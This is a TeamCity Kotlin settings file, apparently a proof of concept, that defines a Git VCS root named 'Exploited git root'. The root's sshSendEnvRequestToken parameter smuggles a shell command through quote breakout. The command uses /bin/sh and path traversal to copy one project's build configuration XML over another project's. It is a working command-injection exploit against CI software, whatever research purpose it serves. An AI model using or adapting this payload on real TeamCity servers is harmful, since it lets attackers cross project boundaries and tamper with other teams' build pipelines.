import jetbrains.buildServer.configs.kotlin.*
import jetbrains.buildServer.configs.kotlin.vcs.GitVcsRoot

/*
The settings script is an entry point for defining a TeamCity
project hierarchy. The script should contain a single call to the
project() function with a Project instance or an init function as
an argument.

VcsRoots, BuildTypes, Templates, and subprojects can be
registered inside the project using the vcsRoot(), buildType(),
template(), and subProject() methods respectively.

To debug settings scripts in command-line, run the

    mvnDebug org.jetbrains.teamcity:teamcity-configs-maven-plugin:generate

command and attach your debugger to the port 8000.

To debug in IntelliJ Idea, open the 'Maven Projects' tool window (View
-> Tool Windows -> Maven Projects), find the generate task node
(Plugins -> teamcity-configs -> teamcity-configs:generate), the
'Debug' option is available in the context menu for the task.
*/

version = "2026.1"

project {

    buildType(Build)
    vcsRoot(HttpsGithubGitssh)
}

object Build : BuildType({
    name = "Build"
})

object HttpsGithubGitssh : GitVcsRoot({
    name = "Exploited git root"

    param("url", "ssh://git@example.invalid/repo.git")
    param("branch", "refs/heads/master")
    param("authMethod", "PRIVATE_KEY_DEFAULT")
    param("ignoreKnownHosts", "true")

   param("sshSendEnvRequestToken", "x\"; /bin/sh -c 'cat ../../../../config/projects/ProjectA/buildTypes/ProjectA_Build.xml > ../../../../config/projects/ProjectB/buildTypes/ProjectB_Build.xml'; #")
})
